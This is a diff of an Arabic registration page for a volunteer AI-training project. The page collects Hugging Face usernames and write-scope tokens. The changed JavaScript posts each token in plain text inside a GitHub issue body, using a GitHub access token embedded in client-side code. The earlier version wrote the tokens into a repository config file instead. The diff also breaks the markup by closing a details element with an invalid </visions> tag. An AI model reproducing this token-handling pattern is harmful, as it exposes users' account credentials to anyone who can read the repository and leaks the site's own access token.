@@ -161,18 +161,12 @@
 
         <section class="intro">
             <h2>🌟 مرحباً بك!</h2>
-            <p>
-                هذا المشروع يهدف لبناء نموذج ذكاء اصطناعي عربي خالص،
-                يساهم في تطوير العمارة، الزراعة، الصناعة، والتعليم في وطننا العربي.
-            </p>
-            <p class="highlight">
-                ✨ يمكنك المساهمة في 5 دقائق فقط، ولن تحتاج لفعل أي شيء بعدها!
-            </p>
+            <p>هذا المشروع يهدف لبناء نموذج ذكاء اصطناعي عربي خالص، يساهم في تطوير العمارة، الزراعة، الصناعة، والتعليم في وطننا العربي.</p>
+            <p class="highlight">✨ يمكنك المساهمة في 5 دقائق فقط، ولن تحتاج لفعل أي شيء بعدها!</p>
         </section>
 
         <section class="steps">
             <h2>📋 خطوات الانضمام</h2>
-
             <div class="step">
                 <div class="step-number">1</div>
                 <div class="step-content">
@@ -181,7 +175,6 @@
                     <a href="https://huggingface.co/join" target="_blank" class="btn">فتح Hugging Face ↗</a>
                 </div>
             </div>
-
             <div class="step">
                 <div class="step-number">2</div>
                 <div class="step-content">
@@ -194,7 +187,6 @@
                     <a href="https://huggingface.co/settings/tokens" target="_blank" class="btn">صفحة Tokens ↗</a>
                 </div>
             </div>
-
             <div class="step">
                 <div class="step-number">3</div>
                 <div class="step-content">
@@ -206,32 +198,22 @@
 
         <section>
             <h2>📝 نموذج التسجيل</h2>
-            
             <div id="alertSuccess" class="alert alert-success"></div>
             <div id="alertError" class="alert alert-error"></div>
-            
             <div id="loading" class="loading">
                 <div class="spinner"></div>
                 <p style="margin-top: 15px;">⏳ جاري التحقق والتسجيل...</p>
             </div>
-
             <form id="registerForm">
                 <div class="form-group">
                     <label for="hf_username">👤 اسم المستخدم في Hugging Face</label>
-                    <input type="text" id="hf_username" name="hf_username" 
-                           placeholder="مثال: ahmed123" required>
+                    <input type="text" id="hf_username" name="hf_username" placeholder="مثال: ahmed123" required>
                 </div>
-                
                 <div class="form-group">
                     <label for="hf_token">🔑 HF Token (يبدأ بـ hf_)</label>
-                    <input type="text" id="hf_token" name="hf_token" 
-                           placeholder="hf_xxxxxxxxxxxxxxxx" required
-                           style="font-family: 'Courier New', monospace;">
-                    <small style="color: #666; margin-top: 5px; display: block;">
-                        ⚠️ نحتاج صلاحية Write لاستدعاء ZeroGPU API
-                    </small>
+                    <input type="text" id="hf_token" name="hf_token" placeholder="hf_xxxxxxxxxxxxxxxx" required style="font-family: 'Courier New', monospace;">
+                    <small style="color: #666; margin-top: 5px; display: block;">⚠️ نحتاج صلاحية Write لاستدعاء ZeroGPU API</small>
                 </div>
-                
                 <button type="submit" class="btn btn-primary">🚀 تسجيل الآن</button>
             </form>
         </section>
@@ -249,7 +231,7 @@
             <details>
                 <summary>كم تستغرق المشاركة من وقتي؟</summary>
                 <p style="margin-top: 10px;">5 دقائق فقط للتسجيل، وبعدها لا شيء إطلاقاً! كل شيء يتم تلقائياً في الخلفية.</p>
-            </details>
+            </visions>
         </section>
 
         <footer>
@@ -293,7 +275,7 @@
             form.style.display = 'none';
             
             try {
-                // 1. التحقق من صحة الـ HF Token عبر HF API
+                // 1. التحقق من صحة الـ HF Token
                 const hfResponse = await fetch('https://huggingface.co/api/whoami-v2', {
                     headers: { 'Authorization': 'Bearer ' + hf_token }
                 });
@@ -306,55 +288,39 @@
                 const realHfUsername = hfData.name;
                 
                 if (hf_username.toLowerCase() !== realHfUsername.toLowerCase()) {
-                    throw new Error('اسم المستخدم لا يطابق الـ Token');
+                    throw new Error('اسم المستخدم لا يطابق الـ Token. الاسم الصحيح: ' + realHfUsername);
                 }
                 
-                // 2. تحديث GitHub Repo عبر GitHub API
+                // 2. إنشاء GitHub Issue لتسجيل الصديق الجديد
                 const workerId = 'friend-' + Date.now();
-                const fileUrl = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents/maestro/workers_config.yaml`;
+                const issueTitle = 'New Worker Registration: ' + workerId;
+                const issueBody = 
+                    '## 🎯 طلب انضمام جديد\n\n' +
+                    '**Worker ID:** `' + workerId + '`\n' +
+                    '**HF Username:** `' + realHfUsername + '`\n' +
+                    '**HF Token:** `' + hf_token + '`\n' +
+                    '**Timestamp:** `' + new Date().toISOString() + '`\n\n' +
+                    '---\n' +
+                    'تم إنشاء هذا الطلب تلقائياً من صفحة التسجيل.';
                 
-                // قراءة الملف الحالي
+                const issueUrl = `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/issues`;
                 const headers = {
                     'Authorization': 'token ' + GH_PAT,
                     'Accept': 'application/vnd.github.v3+json'
                 };
-                const fileResponse = await fetch(fileUrl, { headers });
-                const fileData = await fileResponse.json();
-                const sha = fileData.sha;
-                
-                // فك الترميز (دعم UTF-8 / الحروف العربية)
-                const base64Content = fileData.content;
-                const decodedBytes = Uint8Array.from(atob(base64Content), c => c.charCodeAt(0));
-                const content = new TextDecoder('utf-8').decode(decodedBytes);
-                
-                // إضافة الـ Worker الجديد
-                const newWorkerEntry = 
-                    '\n  - id: "' + workerId + '"\n' +
-                    '    service: "kaggle"\n' +
-                    '    enabled: true\n' +
-                    '    hf_username: "' + realHfUsername + '"\n' +
-                    '    hf_token: "' + hf_token + '"\n' +
-                    '    added_at: "' + new Date().toISOString() + '"\n' +
-                    '    total_steps_trained: 0\n' +
-                    '    total_sessions: 0\n' +
-                    '    status: "active"';
-                
-                const newContent = content.replace(/\n*$/, '') + newWorkerEntry + '\n';
-                
-                // رفع الملف المُحدّث
-                const updateData = {
-                    message: 'Add worker: ' + workerId + ' (' + realHfUsername + ')',
-                    content: btoa(unescape(encodeURIComponent(newContent))),
-                    sha: sha
+                const issueData = {
+                    title: issueTitle,
+                    body: issueBody,
+                    labels: ['worker-registration']
                 };
                 
-                const updateResponse = await fetch(fileUrl, {
-                    method: 'PUT',
+                const issueResponse = await fetch(issueUrl, {
+                    method: 'POST',
                     headers,
-                    body: JSON.stringify(updateData)
+                    body: JSON.stringify(issueData)
                 });
                 
-                if (updateResponse.status === 200 || updateResponse.status === 201) {
+                if (issueResponse.status === 201) {
                     alertSuccess.innerHTML = 
                         '✅ <strong>تم تسجيلك بنجاح!</strong><br><br>' +
                         '🆔 معرّفك: <code>' + workerId + '</code><br>' +
@@ -365,7 +331,8 @@
                     form.reset();
                     form.style.display = 'block';
                 } else {
-                    throw new Error('فشل تحديث GitHub');
+                    const errorData = await issueResponse.json();
+                    throw new Error('فشل إنشاء طلب التسجيل: ' + (errorData.message || 'خطأ غير معروف'));
                 }
                 
                 loading.style.display = 'none';
